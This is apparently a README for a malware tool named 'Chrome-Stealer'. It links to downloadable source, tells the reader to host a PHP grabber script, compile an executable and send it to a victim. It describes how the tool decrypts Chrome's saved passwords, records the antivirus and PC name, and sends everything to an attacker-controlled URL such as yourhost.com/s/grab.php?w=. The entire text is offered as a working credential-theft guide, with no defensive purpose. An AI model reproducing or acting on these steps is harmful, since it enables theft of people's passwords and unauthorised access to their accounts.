# Chrome-Stealer
Download Source Code here : http://www.mediafire.com/file/0i2h7qm5mdld121/wuj.zip/file

Open php files and Upload php grabpass.php and saved_password.txt to host

replace host url in source code linked to grabpass directory in host...

example : yourhost.com/s/grab.php?w=
Open source code to edit...


compile and send exe to victim

if victim opens .. 
wait for 50seconds check saved_passwords.txt in host


How it works ...

this tool has py script as exe in it already which extracts to localapp / priccy 

then executes.. then script decrypts chrome saved passwords sqlite encryption to textfile in c:\program data\chromepass 
note *its also gets AV name and pc name and saves too. 

then vb.net code reads the textfile and calls grabrequest to get the request data and stores it in host ..

You can modify and add more ideas to this code ...
